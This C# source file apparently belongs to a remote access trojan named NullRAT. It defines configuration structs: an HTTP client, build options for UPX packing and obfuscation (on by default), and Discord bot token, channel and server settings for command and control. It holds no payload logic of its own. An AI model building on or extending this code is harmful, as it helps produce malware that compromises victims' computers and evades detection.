using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Text;

namespace NullRAT.Variables;
public struct RequestResponse
{
    public HttpStatusCode StatusCode { get; set; }
    public StringBuilder DataAsString { get; set; } = new();
    public Stream DataAsStream { get; set; }

    public RequestResponse(HttpStatusCode StatusCode, StringBuilder DataAsString, Stream DataAsStream)
    {
        this.StatusCode = StatusCode;
        this.DataAsString = DataAsString;
        this.DataAsStream = DataAsStream;
    }
}

internal struct WebData
{
    private static readonly HttpClientHandler Handler = new()
    {
        SslProtocols = System.Security.Authentication.SslProtocols.Tls12,
        AutomaticDecompression = DecompressionMethods.All
    };

    /// <summary>
    /// The program's main and only HttpClient.
    /// </summary>
    public static HttpClient HttpClient { get; } = new(Handler);
}
internal struct InstanceData
{
    public static bool UpdateAvailable = false;
}
internal struct CompileInstructions
{
    public bool MakeWithCIcon = false;
    public bool UseUPX = false;
    public bool obfuscated = true;
    public CompileInstructions(bool MakeWithCIcon, bool UseUPX, bool obfuscated)
    {
        this.MakeWithCIcon = MakeWithCIcon;
        this.UseUPX = UseUPX;
        this.obfuscated = obfuscated;
    }
}

internal struct RATVariables
{
    public StringBuilder Bot_Token { get; set; } = new();
    public ulong Notification_Channel_ID { get; set; } = new();
    public List<ulong> Server_IDs { get; set; } = new();

    public RATVariables()
    {
    }
}